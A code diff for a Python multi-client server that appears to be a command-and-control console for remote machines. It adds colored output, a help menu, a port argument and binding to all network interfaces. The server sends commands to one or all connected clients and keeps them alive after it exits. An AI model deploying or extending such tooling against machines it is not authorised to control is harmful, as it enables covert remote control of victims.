@@ -56,38 +56,24 @@ import base64
 import random
 import requests
 import tempfile
+import colorama
 import threading
 import subprocess
 import socketserver
 
 
-
 # globals
-
-debug = True
+debug       = True
 exit_status = False
+colorama.init(autoreset=True)
 socket.setdefaulttimeout(None)
+port        = int(sys.argv[1]) if bool(len(sys.argv) == 2 and str(sys.argv[1]).isdigit() and 0 < int(sys.argv[1]) < 65355) else 1337
 
-HELP_CMDS   = ''' 
-Server Commands
---------------------------------------------------------------------
-    command <args> [option] | descripton
---------------------------------------------------------------------
-    client <id>             | Connect to a client
-    clients                 | List connected clients
-    back                    | Deselect current client
-    quit                    | Exit server and keep clients alive
-    usage                   | display usage help for server commands
-    sendall <command>       | Send command to all clients
---------------------------------------------------------------------
-< > = required argument
-[ ] = optional argument
-'''
 
 
 class Server(threading.Thread):
     global exit_status
-    def __init__(self, host='0.0.0.0', port=1337):
+    def __init__(self, port):
         super(Server, self).__init__()
         self.count          = 0
         self.lock           = threading.Event()
@@ -100,7 +86,6 @@ class Server(threading.Thread):
             'quit'          :   self.quit_server,
             'stream'        :   self.stream_client,
 	    'sendall'	    :   self.sendall_clients,
-            'usage'         :   self.usage,
             '--help'        :   self.usage,
             '-h'            :   self.usage,
             '?'             :   self.usage
@@ -108,7 +93,7 @@ class Server(threading.Thread):
         self.manager        = threading.Thread(target=self.client_manager, name='client_manager')
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.s.bind(('localhost', port))
+        self.s.bind(('0.0.0.0', port)) if not debug else self.s.bind(('localhost', port))
         self.s.listen(5)
         self.lock.set()
 
@@ -352,6 +337,22 @@ class Server(threading.Thread):
             if exit_status:
                 break
 
+    def usage(self):
+        print
+        print(colorama.Fore.YELLOW  + colorama.Style.DIM    + '--------------------------------------------------------------------')
+        print(colorama.Fore.WHITE + colorama.Style.BRIGHT   + '    command <argument>      ' + colorama.Fore.YELLOW + colorama.Style.DIM + '|' + colorama.Style.BRIGHT + colorama.Fore.WHITE + ' descripton')
+        print(colorama.Fore.YELLOW  + colorama.Style.DIM    + '--------------------------------------------------------------------')
+        print(colorama.Fore.WHITE + colorama.Style.DIM      + '    back                    ' + colorama.Fore.YELLOW + '|' + colorama.Fore.WHITE + ' Deselect current client')
+        print(colorama.Fore.WHITE + colorama.Style.DIM      + '    quit                    ' + colorama.Fore.YELLOW + '|' + colorama.Fore.WHITE + ' Exit server and keep clients alive')
+        print(colorama.Fore.WHITE + colorama.Style.DIM      + '    usage                   ' + colorama.Fore.YELLOW + '|' + colorama.Fore.WHITE + ' display usage help for server commands')
+        print(colorama.Fore.WHITE + colorama.Style.DIM      + '    clients                 ' + colorama.Fore.YELLOW + '|' + colorama.Fore.WHITE + ' List connected clients')
+        print(colorama.Fore.WHITE + colorama.Style.DIM      + '    client <id>             ' + colorama.Fore.YELLOW + '|' + colorama.Fore.WHITE + ' Connect to a client')
+        print(colorama.Fore.WHITE + colorama.Style.DIM      + '    sendall <command>       ' + colorama.Fore.YELLOW + '|' + colorama.Fore.WHITE + ' Send command to all clients')
+        print(colorama.Fore.YELLOW  + colorama.Style.DIM    +  '--------------------------------------------------------------------')
+        print(colorama.Fore.WHITE + colorama.Style.DIM      + '< > = required argument')
+        print(colorama.Fore.WHITE + colorama.Style.DIM      + '[ ] = optional argument\n')
+        print
+
     def run(self):
         while True:
             if not self.manager.is_alive():
@@ -406,27 +407,27 @@ class ConnectionHandler(threading.Thread):
             self.lock.wait()
             method, data = ('prompt', prompt) if prompt else server.recv_client(self.name)
             if 'prompt' in method:
-                command = raw_input(data % int(self.name))
+                command = raw_input(colorama.Fore.WHITE + colorama.Style.BRIGHT + str(data % int(self.name)))
                 cmd, _, action = command.partition(' ')
                 if cmd in server.commands:
                     result = server.commands[cmd](action) if len(action) else server.commands[cmd]()
                     if result:
-                        print result
+                        print('\n' + Fore.WHITE + colorama.Style.DIM + result)
                     return self.run(prompt=data)
                 else:
                     server.send_client(command, self.name)
                     return self.run()
             else:
                 if data:
-                    print data
+                    print('\n' + colorama.Fore.WHITE + colorama.Style.DIM + data)
          
 
 if __name__ == '__main__':
-    print BANNER
-    p = 1337
-    debug = True
-    server  = Server(port=p)
-    print "Server running on port {}...".format(p)
+    os.system('cls' if os.name is 'nt' else 'clear')
+    print('\n\n\n\n\n\n\n\n\n\n')
+    print('\n' + random.choice([colorama.Fore.MAGENTA, colorama.Fore.CYAN, colorama.Fore.YELLOW, colorama.Fore.RED, colorama.Fore.WHITE, colorama.Fore.BLACK]) + BANNER + colorama.Fore.WHITE + '\n')
+    server  = Server(port)
+    print(colorama.Fore.YELLOW + "[?]" + colorama.Fore.WHITE + " Use '-h/--help' for usage information\n")
     server.start()
 
 
